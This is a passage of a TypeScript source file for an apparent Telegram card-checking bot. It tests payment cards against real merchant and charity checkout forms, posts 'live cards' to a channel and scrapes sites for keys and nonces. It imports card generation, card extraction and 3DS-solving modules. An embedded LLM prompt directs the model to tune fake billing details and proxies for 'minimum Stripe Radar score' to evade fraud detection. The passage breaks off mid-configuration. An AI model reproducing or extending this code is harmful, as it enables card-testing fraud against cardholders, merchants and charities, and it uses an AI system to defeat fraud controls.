import TelegramBot from "node-telegram-bot-api";
import * as fs from "fs";
import * as path from "path";
import { storage } from "./storage";
import { log } from "./index";
import { classifyStripeResponseTag, parseCardInputDetailed, lookupBin, type StripeResponseTag } from "./stripe-checker";
import { pickGateForCountry } from "./gate-router";
import { isMaskEnabled, setMaskEnabled } from "./mask-state";
import { maskCardLine, maskChargeId, maskIntentId } from "./sensitive-mask";
import { runGateCheck } from "./checker";
import { startMiner, stopMiner, isMinerRunning } from "./miner";
import { startRangeMiner, stopRangeMiner, isRangeMinerRunning, type RangeMinerConfig } from "./range-miner";
import { detectGateFromUrl } from "./gate-detector";
import { parseCheckoutLink, hitCheckoutWithCard, type CheckoutSessionData } from "./stripe-hitter";
import { generateCards } from "./card-generator";
import { readAIKey, writeAIKey, clearAIKey, maskAIKey } from "./ai-key";
import { inspectThreeDsChallenge, headlessDrive, formatInspection } from "./three-ds-solver";
import { extractCards, extractBins, summarizeExtraction } from "./cc-extractor";
import { isFeatureEnabled, setFeatureEnabled, getAllFeatureStates, FEATURE_KEYS, type FeatureKey } from "./feature-toggles";
import { getMaxCards, getMassLimits, setMassLimit, resetMassLimits, MASS_LIMIT_HARD_CAP } from "./mass-limits";
import { autoGateName, safeHostname } from "./auto-name";
import { listCachedSessions, clearAllSessions } from "./site-cache";
import { getClassifierState, setStrictDeclineMode } from "./classifier-mode";
import { dedupCardList, checkVelocity, recordCheck, pruneOld, velocityGuardSize, clearVelocityGuard } from "./velocity-guard";

// ── AI configurator helpers ──────────────────────────────────────────────────
function inferCountryFromUrl(url: string): string {
  try {
    const host = new URL(url.startsWith("http") ? url : `https://${url}`).hostname;
    if (/\.co\.uk$|\.uk$/.test(host)) return "GB";
    if (/\.com\.au$|\.au$/.test(host)) return "AU";
    if (/\.ca$/.test(host)) return "CA";
    if (/\.de$/.test(host)) return "DE";
    if (/\.fr$/.test(host)) return "FR";
    if (/\.nl$/.test(host)) return "NL";
    if (/\.ie$/.test(host)) return "IE";
    if (/\.nz$/.test(host)) return "NZ";
  } catch { /* ignore */ }
  return "US";
}

/** Re-detect a URL and best-effort scrape common gate fields off the page. */
async function gatherUrlSignals(url: string): Promise<{ detection: any; pageHints: Record<string, string> }> {
  const detection = await detectGateFromUrl(url).catch(() => ({} as any));
  const pageHints: Record<string, string> = {};
  try {
    const resp = await fetch(url, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" },
      redirect: "follow",
      signal: AbortSignal.timeout(15_000),
    });
    const html = await resp.text();
    const m = (re: RegExp) => html.match(re)?.[1];
    const pk = m(/pk_live_[A-Za-z0-9]+/) as any; if (pk) pageHints.publicKey = String(pk);
    const acct = m(/\bacct_[A-Za-z0-9_-]{8,}\b/) as any; if (acct) pageHints.connectedAccount = String(acct);
    const csk = m(/data-sitekey=["']([^"']+)["']/i); if (csk) pageHints.captchaSiteKey = csk;
    const giveId = m(/give-form-id-prefix["'\s:=]+["']?([0-9]+)/i); if (giveId) pageHints.giveFormId = giveId;
    const gfId = m(/gform_(?:wrapper|form)_(\d+)/); if (gfId) pageHints.gfFormId = gfId;
    if (/woocommerce|wp-content/i.test(html)) pageHints.platformHint = "woocommerce";
    else if (/shopify|cdn\.shopify\.com/i.test(html)) pageHints.platformHint = "shopify";
    else if (/give-form|givewp/i.test(html)) pageHints.platformHint = "givewp";
    else if (/gform_/i.test(html)) pageHints.platformHint = "gravityforms";
    else if (/bigcommerce|stencil/i.test(html)) pageHints.platformHint = "bigcommerce";
    else if (/whmcs/i.test(html)) pageHints.platformHint = "whmcs";
  } catch { /* fall through */ }
  return { detection, pageHints };
}

async function runAiConfigure(chatId: number, telegramId: string, gateId: string, apiKey: string): Promise<void> {
  const gate = await storage.getGateConfig(gateId);
  if (!gate) { bot?.sendMessage(chatId, "⚠️ Gate not found."); return; }

  const progress = await bot?.sendMessage(chatId,
    `🤖 *Analyzing* \`${gate.name}\` …\n\n• Re-detecting URL\n• Scraping page hints\n• Inferring country & platform`,
    { parse_mode: "Markdown" });

  try {
    const { detection, pageHints } = await gatherUrlSignals(gate.url);
    const detectedCountry = inferCountryFromUrl(gate.url);
    const currentSettings = (gate.settings as any) || {};

    if (progress) await bot?.editMessageText(
      `🤖 *Analyzing* \`${gate.name}\` …\n\n✓ URL re-detected\n✓ Hints scraped\n⏳ Asking AI for optimal config`,
      { chat_id: chatId, message_id: progress.message_id, parse_mode: "Markdown" }).catch(() => {});

    const systemPrompt = `You configure payment-gate settings for maximum approval rate and minimum Stripe Radar score.

Rules:
• proxyCountry MUST equal billingCountry (IP/billing mismatch = fraud signal)
• Use realistic names/addresses for the gate's country; pull from the detected country
• currency lowercase ISO: usd/gbp/cad/aud/eur
• Shipping mirrors billing exactly
• timeout = 15000 ms
• donateAmount = "1.00" (or "5.00" for charity/givewp/gravityforms)
• Set platform from page hints when available
• checkoutPath: "/checkout/" (woocommerce), "/donate/" (givewp), "/cart" (shopify), "/" (others)
• Leave btFlow/wcPaySlug blank unless braintree/woocommerce

Respond with ONLY this JSON, no markdown fences, no extra text:
{
  "analysis": "1-2 sentence summary of country, platform, key optimizations",
  "changes": {
    "billingFirstName": "...", "billingLastName": "...", "billingEmail": "...",
    "billingAddress": "...", "billingCity": "...", "billingState": "...",
    "billingZip": "...", "billingCountry": "..", "billingPhone": "+...",
    "shippingFirstName": "...", "shippingLastName": "...", "shippingAddress": "...",
    "shippingCity": "...", "shippingState": "...", "shippingZip": "...", "shippingCountry": "..",
    "currency": "usd", "donateAmount": "1.00", "timeout": 15000,
    "proxyCountry": "US", "platform": "woocommerce",
    "checkoutPath": "/checkout/", "shopPath": "/shop/",
    "wcPaySlug": "stripe", "productId": 0, "btFlow": ""
  }
}`;

    const userPrompt = `Configure this gate:

URL: ${gate.url}
Name: ${gate.name}
Type: ${gate.gateType}/${gate.subType}
Inferred country (from TLD): ${detectedCountry}

Re-detection result:
${JSON.stringify({ gateType: detection?.gateType, subType: detection?.subType, confidence: detection?.confidence, signals: detection?.signals?.slice?.(0, 8) }, null, 2)}

Page hints (scraped from URL):
${JSON.stringify(pageHints, null, 2)}

Current settings (only fields with values shown):
${JSON.stringify(Object.fromEntries(Object.entries(currentSettings).filter(([_, v]) => v != null && v !== "")), null, 2)}`;

    const aiRes = await fetch("https://integrate.api.nvidia.com/v1/chat/completions", {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${apiKey}` },
      body: JSON.stringify({
        model: "meta/llama-3.1-70b-instruct",
        messages: [
          { role: "system", content: systemPrompt },
          { role: "user", content: userPrompt },
        ],
        temperature: 0.4,
        max_tokens: 2048,
      }),
      signal: AbortSignal.timeout(60_000),
    });
    if (!aiRes.ok) throw new Error(`NVIDIA API ${aiRes.status}: ${(await aiRes.text()).slice(0, 200)}`);
    const aiData: any = await aiRes.json();
    const raw: string = aiData.choices?.[0]?.message?.content || "{}";
    const cleaned = raw.replace(/^```(?:json)?\s*/i, "").replace(/\s*```\s*$/i, "").trim();
    let parsed: any;
    try { parsed = JSON.parse(cleaned); } catch { throw new Error("AI returned malformed JSON"); }

    const changes = parsed.changes || {};
    if (!changes || Object.keys(changes).length === 0) throw new Error("AI returned no changes");

    pendingAiConfig.set(telegramId, { gateId, changes, detectedCountry, analysis: parsed.analysis });

    // Build a compact preview
    const previewLines: string[] = [];
    const KEY_ORDER = ["platform", "billingCountry", "billingCity", "billingZip", "currency", "proxyCountry", "checkoutPath", "wcPaySlug", "donateAmount", "timeout"];
    for (const k of KEY_ORDER) {
      if (changes[k] !== undefined) previewLines.push(`• \`${k}\`: ${tgEscape(String(changes[k]))}`);
    }
    const otherCount = Object.keys(changes).length - previewLines.length;
    if (otherCount > 0) previewLines.push(`• _+ ${otherCount} more fields (name, email, shipping, address…)_`);

    const text = `🤖 *AI Configuration Ready*
━━━━━━━━━━━━━━━━━━━━
Gate: \`${tgEscape(gate.name)}\`
Detected: \`${detectedCountry}\` · ${pageHints.platformHint ? "platform=" + pageHints.platformHint : "no platform hint"}

*Analysis:* ${parsed.analysis ? tgEscape(parsed.analysis).slice(0, 300) : "(none)"}

*Preview:*
${previewLines.join("\n")}

Tap *Apply* to merge into settings, or *Cancel* to discard.`;

    const keyboard = [
      [{ text: "✅ Apply", callback_data: "aic_apply" }, { text: "✖️ Cancel", callback_data: "aic_cancel" }],
      [{ text: "🔍 Full Details", callback_data: "aic_show" }],
    ];
    if (progress) {
      await bot?.editMessageText(text, { chat_id: chatId, message_id: progress.message_id, parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } }).catch(() => {
        bot?.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
      });
    } else {
      bot?.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    }
  } catch (e: any) {
    const errText = `❌ AI configure failed: ${e.message || String(e)}`;
    if (progress) await bot?.editMessageText(errText, { chat_id: chatId, message_id: progress.message_id }).catch(() => bot?.sendMessage(chatId, errText));
    else bot?.sendMessage(chatId, errText);
  }
}

let bot: TelegramBot | null = null;
let isPolling = false;

// ── Channel-post pacing (Fix 4) ──────────────────────────────────────────────
// Telegram caps broadcasts at ~20 messages/min/channel; rapid mass-check lives
// hit 429 Too Many Requests mid-batch and posts get dropped silently. We
// serialize channel sends through a promise chain with a minimum 3-second gap
// between successive posts. notifyLiveCardToChannel is called fire-and-forget,
// so chaining inside the function naturally queues a backlog without changing
// any caller. The chain reseats itself even on send failure so a single bad
// post can't wedge the queue forever.
let channelSendChain: Promise<void> = Promise.resolve();
let lastChannelSendMs = 0;
const CHANNEL_MIN_GAP_MS = 3000;
function enqueueChannelSend(send: () => Promise<void>): Promise<void> {
  channelSendChain = channelSendChain.then(async () => {
    const since = Date.now() - lastChannelSendMs;
    if (since < CHANNEL_MIN_GAP_MS && lastChannelSendMs > 0) {
      const wait = CHANNEL_MIN_GAP_MS - since;
      // Tell operator the post is queued — important during big mass checks
      // so they see channel pacing in action, not silent delay.
      console.log(`[notify] channel post queued — waiting ${wait}ms to respect Telegram rate limit`);
      await new Promise(r => setTimeout(r, wait));
    }
    try { await send(); }
    catch (e: any) { console.error(`[notify] queued channel send error: ${e?.message ?? e}`); }
    finally { lastChannelSendMs = Date.now(); }
  });
  return channelSendChain;
}

// ── Channel failure notification (Fix 2) ─────────────────────────────────────
// When chatId is misconfigured or the bot can't post to the channel, live
// cards vanish silently — operator only sees the warning in server logs. We
// DM the owner once per process lifetime with the failure reason so the
// problem doesn't stay invisible. Reset on bot restart (intentional —
// re-warn on a fresh run if it's still broken).
let channelFailureNotifiedThisRun = false;
async function notifyOwnerOfChannelFailure(reason: string, chatId: string | undefined): Promise<void> {
  if (channelFailureNotifiedThisRun) return;
  channelFailureNotifiedThisRun = true;
  try {
    const settings = await storage.getBotSettings();
    if (!settings.ownerId || !bot) return;
    const lines = [
      "⚠️ *Channel broadcast failed*",
      "━━━━━━━━━━━━━━━━━━━━",
      `Live-card posts can't reach the configured channel.`,
      `*Reason:* \`${reason.slice(0, 200)}\``,
      `*Configured chatId:* \`${chatId || "(none)"}\``,
      "",
      "Fix: open the dashboard → Bot Settings, paste the channel id (must start with `-100` for channels), make sure the bot is added to the channel as admin, then trigger a hit. /testchannel verifies wiring without burning a card.",
      "",
      "_(This DM fires once per bot restart. Restart the bot to re-arm.)_",
    ];
    await bot.sendMessage(settings.ownerId, lines.join("\n"), { parse_mode: "Markdown" });
  } catch (e: any) {
    console.error(`[notify] failed to DM owner about channel failure: ${e?.message ?? e}`);
  }
}

const userGateSelection = new Map<string, string>();
const userRandomGate = new Map<string, boolean>();
// Auto-route: when on, each card is sent to a gate tagged with its BIN country
// (US card → US gate) instead of the fixed/random selection. Overrides both.
const userAutoRoute = new Map<string, boolean>();
const adminSessions = new Set<string>();
// Per-admin AI chat history — keyed by telegramId, capped at last 20 turns (in /ai handler).
const aiHistory = new Map<string, Array<{ role: "user" | "assistant"; content: string }>>();
// Pending AI gate-config recommendations awaiting admin Apply / Cancel.
const pendingAiConfig = new Map<string, { gateId: string; changes: Record<string, any>; detectedCountry?: string; analysis?: string }>();

// ─── /editgate state ─────────────────────────────────────────────────────────
// editContext maps admin telegramId → "what I'm currently editing".
//   gateId: the gate being edited
//   awaiting: when set, the next plain-text message from this admin is treated
//             as the value for { category, field }. Cleared after the message
//             is consumed or the admin taps Cancel.
interface EditAwaiting { category: string; field: string; type: "text" | "number" | "csv"; chatId: number; messageId: number; }
interface EditSearchAwait { chatId: number; messageId: number; }
const editContext = new Map<string, { gateId: string; chatId?: number; messageId?: number; awaiting?: EditAwaiting; awaitingSearch?: EditSearchAwait }>();

// ─── /addgate interactive state ──────────────────────────────────────────────
// Three modes: auto (single URL detect+save), mass (multi-URL bulk), manual.
// step tracks where in the flow we are; awaiting means next plain-text message
// will be consumed as the value for that step.
interface GateSetupCtx {
  mode: "auto" | "mass" | "manual";
  step: string;
  chatId: number;
  msgId?: number;
  gateType?: string;
  subType?: string;
  url?: string;
  name?: string;
  publicKey?: string;
  btClientToken?: string;
  detection?: any;
}
const gateSetupCtx = new Map<string, GateSetupCtx>();

// Sub-type options per gate type [label, value]
const GS_SUBTYPES: Record<string, Array<[string, string]>> = {
  stripe: [
    ["Payment Intents", "payment_intents"],
    ["Auth / SetupIntent", "auth"],
    ["Charges API", "charges"],
    ["GiveWP v2", "givewp"],
    ["GiveWP v3", "givewp_v3"],
    ["Charitable", "charitable"],
    ["Gravity Forms", "gravityforms"],
    ["Checkout Session", "checkout_session"],
    ["Page Confirm", "stripe_page_confirm"],
    ["WC Setup Intent", "wc_stripe_confirm_setup_intent"],
  ],
  braintree: [
    ["WC Add-PM", "wc_braintree_addpm"],
    ["WC Checkout", "wc_braintree"],
    ["BigCommerce", "bigcommerce_stencil"],
  ],
  shopify: [["Shopify PCI", "pci"]],
  paypal: [["GiveWP Commerce", "givewp_commerce"], ["PayPal Commerce", "paypal_commerce"], ["Standard", "standard"]],
  payeezy: [["Standard", "standard"]],
};

const GS_TYPE_LABELS: Record<string, string> = {
  stripe: "💳 Stripe", braintree: "🌿 Braintree",
  shopify: "🛍 Shopify", paypal: "🅿️ PayPal", payeezy: "💰 Payeezy",
};

function gsKeyRequired(gateType: string): string | null {
  if (gateType === "braintree") return "Braintree Client Token (eyJ...)";
  if (gateType === "shopify" || gateType === "paypal" || gateType === "payeezy") return null;
  return "Stripe Publishable Key (pk_live_...)";
}

// Single render function — all wizard steps. Both callback and message-capture
// handlers call this so the UI is always consistent.
function gsRenderWizard(ctx: GateSetupCtx): { text: string; keyboard: any[][] } {
  const typeLabel = GS_TYPE_LABELS[ctx.gateType || ""] || ctx.gateType?.toUpperCase() || "—";
  const subtypePair = GS_SUBTYPES[ctx.gateType || ""]?.find(([, v]) => v === ctx.subType);
  const subtypeLabel = subtypePair ? subtypePair[0] : ctx.subType || "—";
  const keyRequired = ctx.gateType ? gsKeyRequired(ctx.gateType) : null;
  const keyVal = ctx.publicKey || ctx.btClientToken;
  const domainShort = safeHostname(ctx.url, ctx.url?.slice(0, 40) || "—");

  // Breadcrumb — every filled field gets a checkmark
  const bc: string[] = [];
  bc.push(ctx.gateType ? `✅ *Gateway:* ${typeLabel}` : `⬜ *Gateway:*`);
  if (ctx.gateType) bc.push(ctx.subType ? `✅ *Sub-type:* ${subtypeLabel}` : `⬜ *Sub-type:*`);
  if (ctx.gateType && ctx.subType) bc.push(ctx.url ? `✅ *URL:* \`${domainShort}\`` : `⬜ *URL:*`);
  if (ctx.gateType && ctx.subType && ctx.url && keyRequired) bc.push(keyVal ? `✅ *Key:* \`${keyVal.slice(0, 18)}…\`` : `⬜ *Key:*`);
  if (ctx.gateType && ctx.subType && ctx.url) bc.push(ctx.name ? `✅ *Name:* \`${ctx.name}\`` : `⬜ *Name:*`);

  const header = `✏️ *Add Gate — Manual*\n━━━━━━━━━━━━━━━━━━━━\n${bc.join("\n")}`;
  const total = keyRequired ? 5 : 4;
  const s = (n: number) => `Step ${n} / ${total}`;

  switch (ctx.step) {
    case "pick_type":
      return {
        text: `${header}\n\n📌 *${s(1)} — Select gateway type:*`,
        keyboard: [
          [{ text: "💳 Stripe", callback_data: "gs_type_stripe" }, { text: "🌿 Braintree", callback_data: "gs_type_braintree" }],
          [{ text: "🛍 Shopify", callback_data: "gs_type_shopify" }, { text: "🅿️ PayPal", callback_data: "gs_type_paypal" }],
          [{ text: "💰 Payeezy", callback_data: "gs_type_payeezy" }],
          [{ text: "⬅️ Back to Menu", callback_data: "gs_back_menu" }, { text: "✖️ Cancel", callback_data: "gs_cancel" }],
        ],
      };

    case "pick_subtype": {
      const pairs = GS_SUBTYPES[ctx.gateType || ""] || [];
      const rows: any[][] = [];
      for (let i = 0; i < pairs.length; i += 2) {
        const row: any[] = [{ text: pairs[i][0], callback_data: `gs_st_${pairs[i][1]}` }];
        if (pairs[i + 1]) row.push({ text: pairs[i + 1][0], callback_data: `gs_st_${pairs[i + 1][1]}` });
        rows.push(row);
      }
      rows.push([{ text: "⬅️ Back", callback_data: "gs_back_type" }, { text: "✖️ Cancel", callback_data: "gs_cancel" }]);
      return { text: `${header}\n\n📌 *${s(2)} — Select sub-type for ${typeLabel}:*`, keyboard: rows };
    }

    case "await_url":
      return {
        text: `${header}\n\n📌 *${s(3)} — Site URL*\n↓ Type the full URL in chat (e.g. \`https://shop.example.com\`):`,
        keyboard: [[{ text: "⬅️ Back", callback_data: "gs_back_subtype" }, { text: "✖️ Cancel", callback_data: "gs_cancel" }]],
      };

    case "confirm_url":
      return {
        text: `${header}\n\n✅ *URL saved.* ${keyRequired ? "Next: paste in your API key." : "Next: give your gate a name."}`,
        keyboard: [
          [keyRequired
            ? { text: "▶️ Enter Key →", callback_data: "gs_step_key" }
            : { text: "▶️ Name Gate →", callback_data: "gs_step_name" }],
          [{ text: "✏️ Change URL", callback_data: "gs_edit_url" }, { text: "⬅️ Back", callback_data: "gs_back_subtype" }],
          [{ text: "✖️ Cancel", callback_data: "gs_cancel" }],
        ],
      };

    case "await_key": {
      const keyHint = ctx.gateType === "braintree"
        ? "Braintree Client Token — starts with `eyJ`"
        : "Stripe Publishable Key — starts with `pk_live_` or `pk_test_`";
      return {
        text: `${header}\n\n📌 *${s(4)} — API Key*\n${keyHint}\n↓ Paste key in chat:`,
        keyboard: [[{ text: "⬅️ Back", callback_data: "gs_back_url" }, { text: "✖️ Cancel", callback_data: "gs_cancel" }]],
      };
    }

    case "confirm_key":
      return {
        text: `${header}\n\n✅ *Key saved.* Next: give your gate a name.`,
        keyboard: [
          [{ text: "▶️ Name Gate →", callback_data: "gs_step_name" }],
          [{ text: "✏️ Change Key", callback_data: "gs_edit_key" }, { text: "⬅️ Back", callback_data: "gs_back_url" }],
          [{ text: "✖️ Cancel", callback_data: "gs_cancel" }],
        ],
      };

    case "await_name":
      return {
        text: `${header}\n\n📌 *${s(keyRequired ? 5 : 4)} — Gate Name*\n↓ Type a display name, or tap Auto-name:`,
        keyboard: [
          [{ text: "⚡ Auto-name", callback_data: "gs_name_skip" }],
          [
            keyRequired
              ? { text: "⬅️ Back", callback_data: "gs_back_key" }
              : { text: "⬅️ Back", callback_data: "gs_back_url" },
            { text: "✖️ Cancel", callback_data: "gs_cancel" },
          ],
        ],
      };

    case "review": {
      const summary = [
        `🔷 *Gateway:* ${typeLabel}`,
        `📌 *Sub-type:* ${subtypeLabel}`,
        `🌐 *URL:* \`${domainShort}\``,
        keyVal ? `🔑 *Key:* \`${keyVal.slice(0, 22)}…\`` : "",
        `🏷 *Name:* \`${ctx.name || "(auto)"}\``,
      ].filter(Boolean).join("\n");
      const editRow2: any[] = [{ text: "✏️ Edit URL", callback_data: "gs_edit_url" }];
      if (keyRequired) editRow2.push({ text: "✏️ Edit Key", callback_data: "gs_edit_key" });
      return {
        text: `✏️ *Review Gate*\n━━━━━━━━━━━━━━━━━━━━\n${summary}\n\nEverything look right?`,
        keyboard: [
          [{ text: "✅ Save Gate", callback_data: "gs_save_manual" }, { text: "⚙️ Save & Configure", callback_data: "gs_save_and_edit" }],
          [{ text: "✏️ Edit Name", callback_data: "gs_edit_name" }, { text: "✏️ Edit Type", callback_data: "gs_back_type" }],
          editRow2,
          [{ text: "✖️ Cancel", callback_data: "gs_cancel" }],
        ],
      };
    }

    default:
      return { text: header, keyboard: [[{ text: "✖️ Cancel", callback_data: "gs_cancel" }]] };
  }
}

// Edit the persisted wizard message in-place, or send a new one if it was deleted.
async function gsEditWizard(chatId: number, telegramId: string, ctx: GateSetupCtx): Promise<void> {
  const { text, keyboard } = gsRenderWizard(ctx);
  const opts = { parse_mode: "Markdown" as const, reply_markup: { inline_keyboard: keyboard } };
  if (ctx.msgId) {
    const ok = await bot?.editMessageText(text, { chat_id: chatId, message_id: ctx.msgId, ...opts }).catch(() => null);
    if (!ok) {
      const sent = await bot?.sendMessage(chatId, text, opts);
      if (sent) { ctx.msgId = sent.message_id; gateSetupCtx.set(telegramId, ctx); }
    }
  } else {
    const sent = await bot?.sendMessage(chatId, text, opts);
    if (sent) { ctx.msgId = sent.message_id; gateSetupCtx.set(telegramId, ctx); }
  }
}

// Thin wrapper so the wizard call sites stay terse — actual logic lives in
// ./auto-name so the dashboard's HTTP routes and the bot produce identical
// names for the same URL.
function gsAutoName(ctx: GateSetupCtx): string {
  return autoGateName(ctx.gateType, ctx.url);
}

// Detection preview shown in the auto-flow confirm card. Only called from
// the auto-detect path where ctx.detection is guaranteed to be set, so the
// no-detection branch this function used to have was dead code.
function gsPreview(ctx: GateSetupCtx, gateName: string): string {
  const d = ctx.detection!;
  const sigs = (d.signals || []).slice(0, 4).join(", ");
  return `🔍 *Detected:* \`${d.gateType?.toUpperCase()}\` · ${d.subType}\n` +
    `*URL:* \`${(ctx.url || "").slice(0, 50)}\`\n` +
    `*Confidence:* ${d.confidence}%\n` +
    `*Signals:* ${sigs || "none"}\n` +
    `*Name:* \`${gateName}\``;
}

interface FieldDef {
  key: string;
  label: string;
  type: "text" | "number" | "bool" | "select" | "csv";
  options?: string[];
  /** when true, the field lives on the gate row itself, not inside settings */
  topLevel?: boolean;
  /** Optional inline example shown in the edit prompt so the admin knows the
   *  expected format. Surface 1-3 plausible values separated by `  •  `. */
  example?: string;
  /** Optional one-line description shown above the prompt so the admin
   *  knows what the field does without leaving Telegram. */
  hint?: string;
}
const FIELD_GROUPS: Record<string, { icon: string; label: string; fields: FieldDef[] }> = {
  basic: {
    icon: "📌", label: "Basic", fields: [
      { key: "name",     label: "Gate Name",    type: "text",   topLevel: true, example: "STRIPE-SHOP  •  GIVEWP-CHARITY",         hint: "Display name in /gates and the picker." },
      { key: "active",   label: "Active",       type: "bool",   topLevel: true,                                                     hint: "If OFF, /chk and /mass skip this gate." },
      { key: "url",      label: "Target URL",   type: "text",   topLevel: true, example: "https://shop.example.com",                hint: "Full site URL — protocol required." },
      { key: "gateType", label: "Gate Type",    type: "select", topLevel: true, options: ["stripe","braintree","shopify","paypal","payeezy"] },
      { key: "subType",  label: "Subtype",      type: "text",   topLevel: true, example: "payment_intents  •  givewp_v3  •  wc_braintree_addpm",
                                                                                                                                    hint: "Identifies the integration flow; see /addgate manual for the full list." },
      { key: "country",  label: "Routing Country", type: "text", topLevel: true, example: "US  •  GB  •  IN  •  (blank = any)",
                                                                                                                                    hint: "ISO-2 country the merchant serves. /autoroute uses this to send same-country cards here." },
    ],
  },
  keys: {
    icon: "🔑", label: "Keys", fields: [
      { key: "publicKey",        label: "Stripe pk_live_",   type: "text", example: "pk_live_51A…BcDeF  •  pk_test_51A…",            hint: "Stripe publishable key — starts with pk_live_ or pk_test_." },
      { key: "btClientToken",    label: "Braintree Token",   type: "text", example: "eyJ2ZXJzaW9uIjoyLCJhdXRob3JpemF0aW9u…",         hint: "Braintree client token (base64 starts with eyJ)." },
      { key: "siteUrl",          label: "Site URL",          type: "text", example: "https://shop.example.com",                     hint: "Mirrors the top-level URL; checker uses this when present." },
      { key: "connectedAccount", label: "Connected acct_",   type: "text", example: "acct_1A2bCdEfGhIjKlMn",                        hint: "Stripe Connect platform account id." },
    ],
  },
  billing: {
    icon: "🏠", label: "Billing", fields: [
      { key: "billingFirstName", label: "First Name",   type: "text", example: "John" },
      { key: "billingLastName",  label: "Last Name",    type: "text", example: "Smith" },
      { key: "billingEmail",     label: "Email",        type: "text", example: "buyer+test@gmail.com",  hint: "Used as form email when site requires one." },
      { key: "billingPhone",     label: "Phone",        type: "text", example: "+15551234567" },
      { key: "billingAddress",   label: "Address",      type: "text", example: "742 Evergreen Terrace" },
      { key: "billingCity",      label: "City",         type: "text", example: "Springfield" },
      { key: "billingState",     label: "State/Region", type: "text", example: "CA  •  NY  •  TX",     hint: "ISO state/region code, not full name." },
      { key: "billingZip",       label: "ZIP / Post",   type: "text", example: "90210  •  SW1A 1AA" },
      { key: "billingCountry",   label: "Country",      type: "select", options: ["US","GB","CA","AU","DE","FR","ES","IT","NL","SE","NO","DK","NZ","SG","AE","JP","IN","BR","MX","PL"] },
    ],
  },
  amount: {
    icon: "💰", label: "Amount", fields: [
      { key: "donateAmount", label: "Donate Amount", type: "text",   example: "5.00  •  10  •  1.00",  hint: "Dollar amount — minimum $0.50 for Stripe Auth." },
      { key: "currency",     label: "Currency",      type: "select", options: ["USD","EUR","GBP","CAD","AUD","JPY","INR"] },
      { key: "donationType", label: "Donation Type", type: "select", options: ["single","subscription"], hint: "subscription uses SetupIntent and bypasses charging." },
    ],
  },
  forms: {
    icon: "🌐", label: "Forms / WC", fields: [
      { key: "platform",        label: "Platform",       type: "select", options: ["woocommerce","shopify","givewp","gravityforms","bigcommerce","payeezy","whmcs","custom"] },
      { key: "formType",        label: "Form Type",      type: "select", options: ["charitable","givewp","gravityforms"] },
      { key: "donatePath",      label: "Donate Path",    type: "text",   example: "/donate  •  /support-us  •  /give-now",         hint: "Path-only; site URL is added automatically." },
      { key: "giveFormId",       label: "GiveWP Form ID",       type: "text", example: "123  •  4567",                                  hint: "Find via view-source of the donation page." },
      { key: "giveFormIdPrefix", label: "GiveWP Form Prefix",   type: "text", example: "6203-1  •  give-form-123-",                    hint: "Some sites need the full prefix (form-id + suffix) — auto-captured by /addgate when present." },
      { key: "gfFormId",         label: "GF Form ID",           type: "text", example: "5",                                             hint: "Gravity Forms numeric form id." },
      { key: "charitableFormId", label: "Charitable Form ID",   type: "text", example: "42  •  101",                                   hint: "Charitable form_id — auto-captured at setup if visible." },
      { key: "wpFsFormName",     label: "WP Full Stripe Form",  type: "text", example: "RiverNetworkChurchDonation  •  TorrIePayments", hint: "WP Full Stripe wpfs-form-name — site-specific. Auto-captured by /addgate. REQUIRED for the wp_full_stripe subtype." },
      { key: "wpfsCustomInputCount", label: "WPFS Custom Inputs", type: "number", example: "1  •  2  •  3",                                  hint: "How many wpfs-custom-input fields the form requires (e.g. 'Donor Name(s)'). Default 1. These fields are JS-rendered so the scraper can't see them; you bump this if the form has multiple required custom fields." },
      { key: "checkoutPath",    label: "Checkout Path",  type: "text",   example: "/checkout  •  /cart/checkout" },
      { key: "shopPath",        label: "Shop Path",      type: "text",   example: "/shop  •  /products/all" },
      { key: "productId",       label: "WC Product ID",  type: "number", example: "42" },
      { key: "wcPaySlug",       label: "WC Pay Slug",    type: "text",   example: "stripe  •  stripe_cc  •  woocommerce_payments  •  braintree_credit_card",
                                                                                                                                    hint: "The payment_method slug WC sends in form data. View page source of /checkout to find it." },
      { key: "wcBlockCheckout", label: "Block Checkout", type: "bool",   hint: "ON if the site uses the new WC Blocks checkout (Store API)." },
      { key: "checkoutScope",   label: "Shopify Scope",  type: "text",   example: "abc123def456",                                  hint: "16-char checkout token from Shopify URL: /checkouts/c/<scope>." },
      { key: "productHandle",   label: "Product Handle", type: "text",   example: "tshirt-blue-large",                             hint: "Shopify product slug — what appears after /products/." },
      { key: "ajaxAction",      label: "AJAX Action",    type: "text",   example: "give_process_donation  •  woocommerce_checkout", hint: "WordPress admin-ajax action name. View source of the form for input name=\"action\"." },
      { key: "ajaxUrl",         label: "AJAX URL",       type: "text",   example: "/wp-admin/admin-ajax.php  •  /api/donate  •  https://site/custom-ajax",       hint: "Override admin-ajax endpoint when site moved or rewrote it (real cause of 404 'Page not found' responses). Auto-captured from inline JS if blank." },
      { key: "paymentMode",     label: "Payment Mode",   type: "text",   example: "stripe  •  stripe_v3  •  paypal-commerce",      hint: "Used by GiveWP/imported gates to pick the right code path." },
    ],
  },
  nonces: {
    icon: "📝", label: "Nonces", fields: [
      { key: "wcNonce",              label: "WC Nonce",          type: "text", example: "a1b2c3d4e5",                hint: "WC checkout nonce — 10-hex from the checkout page." },
      { key: "wcStoreNonce",         label: "Store API Nonce",   type: "text", example: "a1b2c3d4e5",                hint: "WC Blocks Store API nonce." },
      { key: "ajaxNonce",            label: "GiveWP AJAX Nonce", type: "text", example: "abc123def456",              hint: "give_global_vars.nonce — auto-captured by /addgate." },
      { key: "gfPaymentIntentNonce", label: "GF PI Nonce",       type: "text", example: "a1b2c3d4e5",                hint: "Gravity Forms create_payment_intent_nonce." },
      { key: "wpRestNonce",          label: "WP REST Nonce",     type: "text", example: "a1b2c3d4e5",                hint: "wpApiSettings.nonce — REST API auth for GiveWP v3 / WC Blocks." },
      { key: "walletConfigId",       label: "Wallet Config ID",  type: "text", example: "(leave empty)  •  abc-123", hint: "Stripe Apple Pay / Link wallet config. Set empty to skip the field." },
    ],
  },
  bt: {
    icon: "🔵", label: "Braintree", fields: [
      { key: "btMerchantId", label: "BT Merchant ID", type: "text",   example: "abc123def456",                                      hint: "From the BT client token JSON, decoded." },
